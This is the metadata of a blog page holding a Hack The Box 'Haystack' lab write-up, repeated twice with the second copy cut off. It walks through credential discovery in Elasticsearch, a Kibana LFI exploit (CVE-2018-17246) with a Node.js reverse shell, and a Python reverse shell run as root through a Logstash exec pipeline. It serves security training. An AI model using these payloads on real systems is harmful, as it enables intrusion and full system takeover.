<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.2"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Hack The Box - Haystack" /><meta name="author" content="rizemon" /><meta property="og:locale" content="en_US" /><meta name="description" content="I really felt that this machine resonated with me because of the Elastic Stack components running on it and I happened to be learning about them at that point of time XD Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. Always remember to map a domain name to the machine’s IP address to ease your rooting ! 1 $ echo &quot;10.10.10.115 haystack.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 $ nmap -sV -sT -sC haystack.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-29 02:40 EDT Nmap scan report for haystack.htb (10.10.10.115) Host is up (0.63s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA) | 256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA) |_ 256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519) 80/tcp open http nginx 1.12.2 |_http-server-header: nginx/1.12.2 |_http-title: Site doesn&#39;t have a title (text/html). 9200/tcp open http nginx 1.12.2 | http-methods: |_ Potentially risky methods: DELETE |_http-server-header: nginx/1.12.2 |_http-title: Site doesn&#39;t have a title (application/json; charset=UTF-8). Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 95.00 seconds Not much can be done with the ssh service as we do not have any credentials on hand so lets come back to it later. Lets first check out the http service! Haha of course it is a needle! XD Enumeration (1) There doesn’t seem much, so lets brute force the directory and files using gobuster. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 $ gobuster dir -u http://haystack.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://haystack.htb [+] Threads: 200 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2019/08/29 02:13:56 Starting gobuster =============================================================== =============================================================== 2019/08/29 02:18:53 Finished =============================================================== Nothing ? Seems like a dead end. Lets move on to the http service on port 9200. When I saw the port number, I immediately guessed that Elasticsearch was running on it. The below screenshot confirms it. The first step was to know what indexes are available on it. An index is like a table in relational databases and also contains JSON documents that are similar to the rows in a table. 1 2 3 4 5 $ curl http://haystack.htb:9200/_cat/indices?v health status index uuid pri rep docs.count docs.deleted store.size pri.store.size green open .kibana 6tjAYZrgQ5CwwR0g6VOoRg 1 0 1 0 4kb 4kb yellow open quotes ZG2D1IqkQNiNZmi2HRImnQ 5 1 253 0 262.7kb 262.7kb yellow open bank eSVpNfCfREyYoVigNWcrMw 5 1 1000 0 483.2kb 483.2kb There are a total of 3 indices. The .kibana is an index that contains configurations for Kibana. This confirms that there might be a Kibana service running on the machine, but we are unable to access it from the outside. The quotes and bank indexes seem interesting, so lets dump them out! I made a python script to ease my job: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import requests import json def pretty_print(json_string): return json.dumps(json.loads(json_string), indent=4, sort_keys=True) data = { &quot;query&quot;: { &quot;match_all&quot;: {} } } params = { &quot;size&quot;: 10000 } host = &quot;http://haystack.htb:9200&quot; with open(&quot;quotes.txt&quot;, &quot;w&quot;) as f: resp = requests.get(host + &quot;/quotes/_search&quot;, params=params, json=data) f.write(pretty_print(resp.content)) f.close() with open(&quot;bank.txt&quot;, &quot;w&quot;) as f: resp = requests.get(host + &quot;/bank/_search&quot;, params=params, json=data) f.write(pretty_print(resp.content)) f.close() After running the script, we should get quotes.txt and bank.txt, each containing a list of JSONs. For bank.txt, it seems to contain records of personal information 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 &quot;hits&quot;: { &quot;hits&quot;: [ { &quot;_id&quot;: &quot;25&quot;, &quot;_index&quot;: &quot;bank&quot;, &quot;_score&quot;: 1.0, &quot;_source&quot;: { &quot;account_number&quot;: 25, &quot;address&quot;: &quot;171 Putnam Avenue&quot;, &quot;age&quot;: 39, &quot;balance&quot;: 40540, &quot;city&quot;: &quot;Nicholson&quot;, &quot;email&quot;: &quot;virginiaayala@filodyne.com&quot;, &quot;employer&quot;: &quot;Filodyne&quot;, &quot;firstname&quot;: &quot;Virginia&quot;, &quot;gender&quot;: &quot;F&quot;, &quot;lastname&quot;: &quot;Ayala&quot;, &quot;state&quot;: &quot;PA&quot; }, &quot;_type&quot;: &quot;account&quot; }, ... ] } For quotes.txt, it seems to contain paragraphs in spanish ? 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 &quot;hits&quot;: { &quot;hits&quot;: [ { &quot;_id&quot;: &quot;14&quot;, &quot;_index&quot;: &quot;quotes&quot;, &quot;_score&quot;: 1.0, &quot;_source&quot;: { &quot;quote&quot;: &quot;En Am\u00e9rica se desarrollaron importantes civilizaciones, como Caral (la civilizaci\u00f3n m\u00e1s antigua de Am\u00e9rica, la cual se desarroll\u00f3 en la zona central de Per\u00fa), los anasazi, los indios pueblo, quimbaya, nazca, chim\u00fa, chav\u00edn, paracas, moche, huari, lima, zapoteca, mixteca, totonaca, tolteca, olmeca y chibcha, y las avanzadas civilizaciones correspondientes a los imperios de Teotihuacan, Tiahuanaco, maya, azteca e inca, entre muchos otros.&quot; }, &quot;_type&quot;: &quot;quote&quot; }, ... ] } It really was like finding a needle in a haystack as I did not know what I was looking for but I still tried to manually look through quotes.txt. Then I came across this: 1 2 3 4 5 6 7 8 9 { &quot;_id&quot;: &quot;2&quot;, &quot;_index&quot;: &quot;quotes&quot;, &quot;_score&quot;: 1.0, &quot;_source&quot;: { &quot;quote&quot;: &quot;There&#39;s a needle in this haystack, you have to search for it&quot; }, &quot;_type&quot;: &quot;quote&quot; } Well I guess that was helpful? :/ After a while I found something interesting! 1 2 3 4 5 6 7 8 9 { &quot;_id&quot;: &quot;111&quot;, &quot;_index&quot;: &quot;quotes&quot;, &quot;_score&quot;: 1.0, &quot;_source&quot;: { &quot;quote&quot;: &quot;Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk=&quot; }, &quot;_type&quot;: &quot;quote&quot; } There seems to be some Base64-encoded string in the quote! Decoding it, we get pass: spanish.is.key If there is a password, there must be a username! Lets carry on searching… 1 2 3 4 5 6 7 8 9 { &quot;_id&quot;: &quot;45&quot;, &quot;_index&quot;: &quot;quotes&quot;, &quot;_score&quot;: 1.0, &quot;_source&quot;: { &quot;quote&quot;: &quot;Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg &quot; }, &quot;_type&quot;: &quot;quote&quot; }, Finally! Likewise, there was a Base64-encoded string. Decoding it, we get user: security. user.txt Using security:spanish.is.key, we try to log in via ssh. 1 2 3 4 5 6 $ ssh security@haystack.htb security@haystack.htb&#39;s password: [security@haystack ~]$ ls user.txt [security@haystack ~]$ cat user.txt 04d1XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) As security, we need to know what processes are being runned on the machine. To do so, I will be using pspy. To transfer it from my machine to this machine, I will be using python’s SimpleHTTPServer module. On my machine: 1 2 3 4 5 $ mkdir httpserver $ cd httpserver $ cp ~/Downloads/pspy64 . $ python -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ... On the Haystack machine: 1 2 3 4 5 6 [security@haystack tmp]$ curl http://10.10.14.75/pspy64 &gt; pspy64 % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 4364k 100 4364k 0 0 639k 0 0:00:06 0:00:06 --:--:-- 834k [security@haystack tmp]$ chmod 777 pspy64 [security@haystack tmp]$ ./pspy64 After a while, I noticed a process running with root privileges and the process is Logstash! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 2019/08/29 06:20:05 CMD: UID=0 PID=6397 | /bin/java -Xms500m -Xmx500m -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -Djava.awt.headless=true -Dfile.encoding=UTF-8 -Djruby.compile.invokedynamic=true -Djruby.jit.threshold=0 -XX:+HeapDumpOnOutOfMemoryError -Djava.security.egd=file:/dev/urandom -cp /usr/share/logstash/logstash-core/lib/jars/animal-sniffer-annotations-1.14.jar:/usr/share/logstash/logstash-core/lib/jars/ commons-codec-1.11.jar:/usr/share/logstash/logstash-core/lib/jars/commons-compiler-3.0.8.jar:/usr/share/logstash/logstash-core/ lib/jars/error_prone_annotations-2.0.18.jar:/usr/share/logstash/logstash-core/lib/jars/google-java-format-1.1.jar:/usr/share/ logstash/logstash-core/lib/jars/gradle-license-report-0.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/guava-22.0.jar:/usr/ share/logstash/logstash-core/lib/jars/j2objc-annotations-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/ jackson-annotations-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-core-2.9.5.jar:/usr/share/logstash/logstash-core/ lib/jars/jackson-databind-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-dataformat-cbor-2.9.5.jar:/usr/share/ logstash/logstash-core/lib/jars/janino-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/jruby-complete-9.1.13.0.jar:/usr/ share/logstash/logstash-core/lib/jars/jsr305-1.3.9.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-api-2.9.1.jar:/usr/share/ logstash/logstash-core/lib/jars/log4j-core-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-slf4j-impl-2.9.1.jar:/usr/ share/logstash/logstash-core/lib/jars/logstash-core.jar:/usr/share/logstash/logstash-core/lib/jars/ org.eclipse.core.commands-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.contenttype-3.4.100.jar:/usr/ share/logstash/logstash-core/lib/jars/org.eclipse.core.expressions-3.4.300.jar:/usr/share/logstash/logstash-core/lib/jars/ org.eclipse.core.filesystem-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.jobs-3.5.100.jar:/usr/share/ logstash/logstash-core/lib/jars/org.eclipse.core.resources-3.7.100.jar:/usr/share/logstash/logstash-core/lib/jars/ org.eclipse.core.runtime-3.7.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.app-1.3.100.jar:/usr/share/ logstash/logstash-core/lib/jars/org.eclipse.equinox.common-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/ org.eclipse.equinox.preferences-3.4.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.registry-3.5.101.jar:/ usr/share/logstash/logstash-core/lib/jars/org.eclipse.jdt.core-3.10.0.jar:/usr/share/logstash/logstash-core/lib/jars/ org.eclipse.osgi-3.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.text-3.5.101.jar:/usr/share/logstash/ logstash-core/lib/jars/slf4j-api-1.7.25.jar org.logstash.Logstash --path.settings /etc/logstash Logstash is a program that is able to injest data or logs, process them and forward to other destinations. The configuration files for Logstash are typically located at /etc/logstash. 1 2 3 4 5 [security@haystack ~]$ ls /etc/logstash conf.d log4j2.properties logstash.yml pipelines.yml jvm.options logstash-sample.conf logstash.yml.rpmnew startup.options [security@haystack logstash]$ ls /etc/logstash/conf.d filter.conf input.conf output.conf In the conf.d folder contains the files on how Logstash processes the information. input.conf: 1 2 3 4 5 6 7 8 9 10 input { file { path =&gt; &quot;/opt/kibana/logstash_*&quot; start_position =&gt; &quot;beginning&quot; sincedb_path =&gt; &quot;/dev/null&quot; stat_interval =&gt; &quot;10 second&quot; type =&gt; &quot;execute&quot; mode =&gt; &quot;read&quot; } } filter.conf: 1 2 3 4 5 6 7 8 filter { if [type] == &quot;execute&quot; { grok { match =&gt; { &quot;message&quot; =&gt; &quot;Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}&quot; } } } } output.conf: 1 2 3 4 5 6 7 8 output { if [type] == &quot;execute&quot; { stdout { codec =&gt; json } exec { command =&gt; &quot;%{comando} &amp;&quot; } } } From these, we can tell that Logstash is: Reading line by line from all files in /opt/kibana that starts with logstash_ Parsing each line using a certain format Ejecutar comando : &lt;COMMAND&gt; Executing the captured &lt;COMMAND&gt; To start off, lets try to create a file in /opt/kibana. But unfortunately, we are not able to as we do not have write permission :( 1 2 3 4 [security@haystack ~]$ touch /opt/kibana/logstash_cmd touch: cannot touch ‘/opt/kibana/logstash_cmd’: Permission denied [security@haystack ~]$ ls -l /opt | grep kibana drwxr-x---. 2 kibana kibana 6 Aug 29 01:35 kibana To be able to write to /opt/kibana, we need to be kibana. But how? First, we will need to find out where is kibana is running from. 1 2 3 4 5 [security@haystack ~]$ ps aux | grep kibana kibana 6401 0.4 5.0 1360968 194848 ? Ssl 00:13 1:47 /usr/share/kibana/bin/../node/bin/node --no-warnings /usr/share/ kibana/bin/../src/cli -c /etc/kibana/kibana.yml [security@haystack ~]$ ls /usr/share/kibana/bin kibana kibana-keystore kibana-plugin Exploitation We then find out what is the version of kibana. 1 2 [security@haystack ~]$ /usr/share/kibana/bin/kibana --version 6.4.2 This version of kibana is affected by the local file inclusion vulnerability CVE-2018-17246. More information on how to exploit it could be found here Lets create a reverse shell file written in node. 1 2 3 4 5 6 7 8 9 10 11 12 (function(){ var net = require(&quot;net&quot;), cp = require(&quot;child_process&quot;), sh = cp.spawn(&quot;/bin/bash&quot;, []); var client = new net.Socket(); client.connect(1337, &quot;10.10.XXX.XXX&quot;, function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; // Prevents the Node.js application form crashing })(); And transfer it over to the Haystack machine. 1 2 3 4 5 [security@haystack tmp]$ curl http://10.10.14.75/exploit.js &gt; exploit.js % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 383 100 383 0 0 578 0 --:--:-- --:--:-- --:--:-- 578 [security@haystack tmp]$ chmod 777 exploit.js On our machine, we start a listener. 1 2 $ nc -lvnp 1337 listening on [any] 1337 ... We then proceed to exploit the vulnerability on the Haystack machine. 1 2 3 [security@haystack tmp]$ curl -XGET &quot;http://127.0.0.1:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis=../../../../../../../../../../../ tmp/exploit.js&quot; Back to our machine, we caught the reverse shell. 1 2 3 4 connect to [10.10.XXX.XXX] from (UNKNOWN) [10.10.10.115] 39144 python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; bash-4.2$ id uid=994(kibana) gid=992(kibana) grupos=992(kibana) contexto=system_u:system_r:unconfined_service_t:s0 root.txt As user kibana, we can now write to the /opt/kibana directory. 1 2 3 4 bash-4.2$ touch /opt/kibana/logstash_cmd touch /opt/kibana/logstash_cmd bash-4.2$ chmod 777 /opt/kibana/logstash_cmd chmod 777 /opt/kibana/logstash_cmd Before writing the line to the file, we need to first start another listener on our machine. 1 2 $ nc -lvnp 1338 listening on [any] 1338 ... We then proceeded to write our reverse shell command to the file. 1 2 3 bash-4.2$ echo &quot;Ejecutar comando : python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\&quot;10.10.XXX.XXX\&quot;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/ sh\&quot;,\&quot;-i\&quot;]);&#39;&quot; &gt;&gt; /opt/kibana/logstash_cmd Back to our machine, we finally got a root shell! 1 2 3 4 5 6 connect to [10.10.XXX.XXX] from (UNKNOWN) [10.10.10.115] 57600 sh: no hay control de trabajos en este shell sh-4.2# id uid=0(root) gid=0(root) grupos=0(root) contexto=system_u:system_r:unconfined_service_t:s0 sh-4.2# cat /root/root.txt 3f5fXXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !" /><meta property="og:description" content="I really felt that this machine resonated with me because of the Elastic Stack components running on it and I happened to be learning about them at that point of time XD Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. Always remember to map a domain name to the machine’s IP address to ease your rooting ! 1 $ echo &quot;10.10.10.115 haystack.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 $ nmap -sV -sT -sC haystack.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-29 02:40 EDT Nmap scan report for haystack.htb (10.10.10.115) Host is up (0.63s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA) | 256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA) |_ 256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519) 80/tcp open http nginx 1.12.2 |_http-server-header: nginx/1.12.2 |_http-title: Site doesn&#39;t have a title (text/html). 9200/tcp open http nginx 1.12.2 | http-methods: |_ Potentially risky methods: DELETE |_http-server-header: nginx/1.12.2 |_http-title: Site doesn&#39;t have a title (application/json; charset=UTF-8). Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 95.00 seconds Not much can be done with the ssh service as we do not have any credentials on hand so lets come back to it later. Lets first check out the http service! Haha of course it is a needle! XD Enumeration (1) There doesn’t seem much, so lets brute force the directory and files using gobuster. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 $ gobuster dir -u http://haystack.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://haystack.htb [+] Threads: 200 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2019/08/29 02:13:56 Starting gobuster =============================================================== =============================================================== 2019/08/29 02:18:53 Finished =============================================================== Nothing ? Seems like a dead end. Lets move on to the http service on port 9200. When I saw the port number, I immediately guessed that Elasticsearch was running on it. The below screenshot confirms it. The first step was to know what indexes are available on it. An index is like a table in relational databases and also contains JSON documents that are similar to the rows in a table. 1 2 3 4 5 $ curl http://haystack.htb:9200/_cat/indices?v health status index uuid pri rep docs.count docs.deleted store.size pri.store.size green open .kibana 6tjAYZrgQ5CwwR0g6VOoRg 1 0 1 0 4kb 4kb yellow open quotes ZG2D1IqkQNiNZmi2HRImnQ 5 1 253 0 262.7kb 262.7kb yellow open bank eSVpNfCfREyYoVigNWcrMw 5 1 1000 0 483.2kb 483.2kb There are a total of 3 indices. The .kibana is an index that contains configurations for Kibana. This confirms that there might be a Kibana service running on the machine, but we are unable to access it from the outside. The quotes and bank indexes seem interesting, so lets dump them out! I made a python script to ease my job: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import requests import json def pretty_print(json_string): return json.dumps(json.loads(json_string), indent=4, sort_keys=True) data = { &quot;query&quot;: { &quot;match_all&quot;: {} } } params = { &quot;size&quot;: 10000 } host = &quot;http://haystack.htb:9200&quot; with open(&quot;quotes.txt&quot;, &quot;w&quot;) as f: resp = requests.get(host + &quot;/quotes/_search&quot;, params=params, json=data) f.write(pretty_print(resp.content)) f.close() with open(&quot;bank.txt&quot;, &quot;w&quot;) as f: resp = requests.get(host + &quot;/bank/_search&quot;, params=params, json=data) f.write(pretty_print(resp.content)) f.close() After running the script, we should get quotes.txt and bank.txt, each containing a list of JSONs. For bank.txt, it seems to contain records of personal information 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 &quot;hits&quot;: { &quot;hits&quot;: [ { &quot;_id&quot;: &quot;25&quot;, &quot;_index&quot;: &quot;bank&quot;, &quot;_score&quot;: 1.0, &quot;_source&quot;: { &quot;account_number&quot;: 25, &quot;address&quot;: &quot;171 Putnam Avenue&quot;, &quot;age&quot;: 39, &quot;balance&quot;: 40540, &quot;city&quot;: &quot;Nicholson&quot;, &quot;email&quot;: &quot;virginiaayala@filodyne.com&quot;, &quot;employer&quot;: &quot;Filodyne&quot;, &quot;firstname&quot;: &quot;Virginia&quot;, &quot;gender&quot;: &quot;F&quot;, &quot;lastname&quot;: &quot;Ayala&quot;, &quot;state&quot;: &quot;PA&quot; }, &quot;_type&quot;: &quot;account&quot; }, ... ] } For quotes.txt, it seems to contain paragraphs in spanish ? 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 &quot;hits&quot;: { &quot;hits&quot;: [ { &quot;_id&quot;: &quot;14&quot;, &quot;_index&quot;: &quot;quotes&quot;, &quot;_score&quot;: 1.0, &quot;_source&quot;: { &quot;quote&quot;: &quot;En Am\u00e9rica se desarrollaron importantes civilizaciones, como Caral (la civilizaci\u00f3n m\u00e1s antigua de Am\u00e9rica, la cual se desarroll\u00f3 en la zona central de Per\u00fa), los anasazi, los indios pueblo, quimbaya, nazca, chim\u00fa, chav\u00edn, paracas, moche, huari, lima, zapoteca, mixteca, totonaca, tolteca, olmeca y chibcha, y las avanzadas civilizaciones correspondientes a los imperios de Teotihuacan, Tiahuanaco, maya, azteca e inca, entre muchos otros.&quot; }, &quot;_type&quot;: &quot;quote&quot; }, ... ] } It really was like finding a needle in a haystack as I did not know what I was looking for but I still tried to manually look through quotes.txt. Then I came across this: 1 2 3 4 5 6 7 8 9 { &quot;_id&quot;: &quot;2&quot;, &quot;_index&quot;: &quot;quotes&quot;, &quot;_score&quot;: 1.0, &quot;_source&quot;: { &quot;quote&quot;: &quot;There&#39;s a needle in this haystack, you have to search for it&quot; }, &quot;_type&quot;: &quot;quote&quot; } Well I guess that was helpful? :/ After a while I found something interesting! 1 2 3 4 5 6 7 8 9 { &quot;_id&quot;: &quot;111&quot;, &quot;_index&quot;: &quot;quotes&quot;, &quot;_score&quot;: 1.0, &quot;_source&quot;: { &quot;quote&quot;: &quot;Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk=&quot; }, &quot;_type&quot;: &quot;quote&quot; } There seems to be some Base64-encoded string in the quote! Decoding it, we get pass: spanish.is.key If there is a password, there must be a username! Lets carry on searching… 1 2 3 4 5 6 7 8 9 { &quot;_id&quot;: &quot;45&quot;, &quot;_index&quot;: &quot;quotes&quot;, &quot;_score&quot;: 1.0, &quot;_source&quot;: { &quot;quote&quot;: &quot;Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg &quot; }, &quot;_type&quot;: &quot;quote&quot; }, Finally! Likewise, there was a Base64-encoded string. Decoding it, we get user: security. user.txt Using security:spanish.is.key, we try to log in via ssh. 1 2 3 4 5 6 $ ssh security@haystack.htb security@haystack.htb&#39;s password: [security@haystack ~]$ ls user.txt [security@haystack ~]$ cat user.txt 04d1XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) As security, we need to know what processes are being runned on the machine. To do so, I will be using pspy. To transfer it from my machine to this machine, I will be using python’s SimpleHTTPServer module. On my machine: 1 2 3 4 5 $ mkdir httpserver $ cd httpserver $ cp ~/Downloads/pspy64 . $ python -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ... On the Haystack machine: 1 2 3 4 5 6 [security@haystack tmp]$ curl http://10.10.14.75/pspy64 &gt; pspy64 % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 4364k 100 4364k 0 0 639k 0 0:00:06 0:00:06 --:--:-- 834k [security@haystack tmp]$ chmod 777 pspy64 [security@haystack tmp]$ ./pspy64 After a while, I noticed a process running with root privileges and the process is Logstash! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 2019/08/29 06:20:05 CMD: UID=0 PID=6397 | /bin/java -Xms500m -Xmx500m -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -Djava.awt.headless=true -Dfile.encoding=UTF-8 -Djruby.compile.invokedynamic=true -Djruby.jit.threshold=0 -XX:+HeapDumpOnOutOfMemoryError -Djava.security.egd=file:/dev/urandom -cp /usr/share/logstash/logstash-core/lib/jars/animal-sniffer-annotations-1.14.jar:/usr/share/logstash/logstash-core/lib/jars/ commons-codec-1.11.jar:/usr/share/logstash/logstash-core/lib/jars/commons-compiler-3.0.8.jar:/usr/share/logstash/logstash-core/ lib/jars/error_prone_annotations-2.0.18.jar:/usr/share/logstash/logstash-core/lib/jars/google-java-format-1.1.jar:/usr/share/ logstash/logstash-core/lib/jars/gradle-license-report-0.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/guava-22.0.jar:/usr/ share/logstash/logstash-core/lib/jars/j2objc-annotations-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/ jackson-annotations-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-core-2.9.5.jar:/usr/share/logstash/logstash-core/ lib/jars/jackson-databind-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-dataformat-cbor-2.9.5.jar:/usr/share/ logstash/logstash-core/lib/jars/janino-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/jruby-complete-9.1.13.0.jar:/usr/ share/logstash/logstash-core/lib/jars/jsr305-1.3.9.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-api-2.9.1.jar:/usr/share/ logstash/logstash-core/lib/jars/log4j-core-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-slf4j-impl-2.9.1.jar:/usr/ share/logstash/logstash-core/lib/jars/logstash-core.jar:/usr/share/logstash/logstash-core/lib/jars/ org.eclipse.core.commands-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.contenttype-3.4.100.jar:/usr/ share/logstash/logstash-core/lib/jars/org.eclipse.core.expressions-3.4.300.jar:/usr/share/logstash/logstash-core/lib/jars/ org.eclipse.core.filesystem-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.jobs-3.5.100.jar:/usr/share/ logstash/logstash-core/lib/jars/org.eclipse.core.resources-3.7.100.jar:/usr/share/logstash/logstash-core/lib/jars/ org.eclipse.core.runtime-3.7.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.app-1.3.100.jar:/usr/share/ logstash/logstash-core/lib/jars/org.eclipse.equinox.common-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/ org.eclipse.equinox.preferences-3.4.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.registry-3.5.101.jar:/ usr/share/logstash/logstash-core/lib/jars/org.eclipse.jdt.core-3.10.0.jar:/usr/share/logstash/logstash-core/lib/jars/ org.eclipse.osgi-3.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.text-3.5.101.jar:/usr/share/logstash/ logstash-core/lib/jars/slf4j-api-1.7.25.jar org.logstash.Logstash --path.settings /etc/logstash Logstash is a program that is able to injest data or logs, process them and forward to other destinations. The configuration files for Logstash are typically located at /etc/logstash. 1 2 3 4 5 [security@haystack ~]$ ls /etc/logstash conf.d log4j2.properties logstash.yml pipelines.yml jvm.options logstash-sample.conf logstash.yml.rpmnew startup.options [security@haystack logstash]$ ls /etc/logstash/conf.d filter.conf input.conf output.conf In the conf.d folder contains the files on how Logstash processes the information. input.conf: 1 2 3 4 5 6 7 8 9 10 input { file { path =&gt; &quot;/opt/kibana/logstash_*&quot; start_position =&gt; &quot;beginning&quot; sincedb_path =&gt; &quot;/dev/null&quot; stat_interval =&gt; &quot;10 second&quot; type =&gt; &quot;execute&quot; mode =&gt; &quot;read&quot; } } filter.conf: 1 2 3 4 5 6 7 8 filter { if [type] == &quot;execute&quot; { grok { match =&gt; { &quot;message&quot; =&gt; &quot;Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}&quot; } } } } output.conf: 1 2 3 4 5 6 7 8 output { if [type] == &quot;execute&quot; { stdout { codec =&gt; json } exec { command =&gt; &quot;%{comando} &amp;&quot; } } } From these, we can tell that Logstash is: Reading line by line from all files in /opt/kibana that starts with logstash_ Parsing each line using a certain format Ejecutar comando : &lt;COMMAND&gt; Executing the captured &lt;COMMAND&gt; To start off, lets try to create a file in /opt/kibana. But unfortunately, we are not able to as we do not have write permission :( 1 2 3 4 [security@haystack ~]$ touch /opt/kibana/logstash_cmd touch: cannot touch ‘/opt/kibana/logstash_cmd’: Permission denied [security@haystack ~]$ ls -l /opt | grep kibana drwxr-x---. 2 kibana kibana 6 Aug 29 01:35 kibana To be able to write to /opt/kibana, we need to be kibana. But how? First, we will need to find out where is kibana is running from. 1 2 3 4 5 [security@haystack ~]$ ps aux | grep kibana kibana 6401 0.4 5.0 1360968 194848 ? Ssl 00:13 1:47 